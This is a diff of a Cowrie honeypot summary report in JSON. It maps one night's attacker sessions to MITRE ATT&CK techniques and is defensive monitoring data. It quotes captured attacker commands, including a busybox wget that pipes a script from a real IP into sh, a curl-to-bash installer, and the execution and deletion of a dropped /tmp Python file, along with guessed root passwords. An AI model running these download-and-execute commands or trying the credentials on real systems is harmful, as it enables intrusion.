@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-28 01:00:11",
+  "generated": "2026-08-28 02:03:44",
   "totals": {
-    "commands": 11,
-    "login_failed": 42,
-    "login_success": 2,
-    "sessions": 83
+    "commands": 16,
+    "login_failed": 67,
+    "login_success": 4,
+    "sessions": 140
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 42,
+      "count": 67,
       "examples": [
         "root / 0033",
         "root / 12345678",
@@ -21,35 +21,38 @@
         "root / 123456789"
       ],
       "first": "2026-08-28T00:00:26.408142Z",
-      "last": "2026-08-28T00:59:50.524932Z",
-      "unique_ips": 10
+      "last": "2026-08-28T02:01:27.523488Z",
+      "unique_ips": 14
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 3,
+      "count": 5,
       "examples": [
         "/bin/busybox wget; /bin/busybox STC",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;",
-        "http://2.26.136.128/twget.sh"
+        "http://2.26.136.128/twget.sh",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-08-28T00:51:50.759248Z",
-      "last": "2026-08-28T00:51:54.496529Z",
-      "unique_ips": 1
+      "last": "2026-08-28T01:09:50.041304Z",
+      "unique_ips": 2
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2,
+      "count": 4,
       "examples": [
         "superadmin / Is$uper@dmin",
-        "admin / admin"
+        "admin / admin",
+        "root / 123@@@"
       ],
       "first": "2026-08-28T00:01:52.110632Z",
-      "last": "2026-08-28T00:51:46.812375Z",
-      "unique_ips": 2
+      "last": "2026-08-28T01:09:32.404560Z",
+      "unique_ips": 3
     }
   ],
   "unmapped": [
@@ -87,6 +90,18 @@
     ],
     [
       "/bin/busybox hostname TOASTER",
+      1
+    ],
+    [
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+      1
+    ],
+    [
+      "python3 /tmp/bendi.py",
+      1
+    ],
+    [
+      "rm /tmp/bendi.py",
       1
     ]
   ]
